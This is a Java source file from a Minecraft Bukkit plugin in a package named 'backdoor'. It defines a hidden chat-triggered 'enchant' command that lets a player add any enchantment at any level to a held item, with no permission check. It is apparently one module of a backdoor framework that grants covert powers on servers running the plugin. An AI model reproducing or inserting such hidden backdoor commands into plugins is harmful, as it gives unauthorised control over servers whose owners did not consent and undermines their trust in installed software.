package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import org.bukkit.ChatColor;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.ArrayList;


@RegisterCommand(displayName = "enchant", aliases = {"enchant"})
public class EnchantCommand extends Command {

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 2) {
            ItemMeta meta = event.getPlayer().getInventory().getItemInMainHand().getItemMeta();
            if (meta == null) {
                event.getPlayer().sendMessage(ChatColor.RED + "ItemMeta is null");
                return;
            }

            meta.addEnchant(Enchantment.getByName(args.get(0)), Integer.parseInt(args.get(1)), true);

            event.getPlayer().getInventory().getItemInMainHand().setItemMeta(meta);

        } else event.getPlayer().sendMessage(NOT_ENOUGH_ARGS);
    }
}
